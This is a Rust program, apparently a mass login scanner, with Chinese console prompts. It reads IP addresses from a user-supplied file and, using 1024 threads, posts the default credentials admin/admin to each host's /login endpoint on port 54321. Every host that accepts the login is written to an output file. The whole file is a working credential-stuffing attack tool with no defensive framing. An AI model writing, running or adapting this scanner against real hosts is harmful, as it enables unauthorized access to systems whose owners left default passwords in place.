use std::fs::{File, OpenOptions};
use std::io::{Write, BufRead, BufReader};

fn main() {
    let port: String = "54321".to_string();
    let data = vec![
        ("username", "admin"),
        ("password", "admin"),
    ];
    let filename = input("文件名:");
    let file = File::open(&filename).expect("Failed to open file");
    let outputfilename = format!("output{}", filename.clone());

    let reader = BufReader::new(file);
    let pool = threadpool::ThreadPool::new(1024);
    if  !std::path::Path::new(&outputfilename).exists() {
        File::create(&outputfilename).expect("Failed to create file");
    }

    let results_file = OpenOptions::new() 
    .append(true)
    .open(outputfilename)
    .expect("Failed to open file");


    for line in reader.lines() {
        let ip = line.expect("Failed to read line").trim().to_string();
        let port_clone = port.clone();
        let data_clone = data.clone();
        let result = results_file.try_clone().expect("Failed to clone file");

        pool.execute(move || {
            post_request(ip, port_clone, data_clone, result);
        });
    }

    pool.join();
}

fn post_request(ip: String, port: String, data: Vec<(&str, &str)>, mut result:File) {
    let url = format!("http://{}:{}/login", ip, port);

    match reqwest::blocking::Client::new()
        .post(&url)
        .form(&data)
        .timeout(std::time::Duration::from_secs(2))
        .send()
    {
        Ok(response) => {
            if let Ok(json) = response.json::<serde_json::Value>() {
                if json["success"] == true {
                    println!("成功 {}", ip);
                    result.write((ip+"\n").as_bytes()).expect("Failed to write file");
                    
                } else {
                }
            } else {
            }
        }
        Err(_) => {
        }
    }
}

fn input(prompt: &str) -> String {
    println!("{}", prompt);
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).expect("Failed to read line");
    input.trim().to_string()
}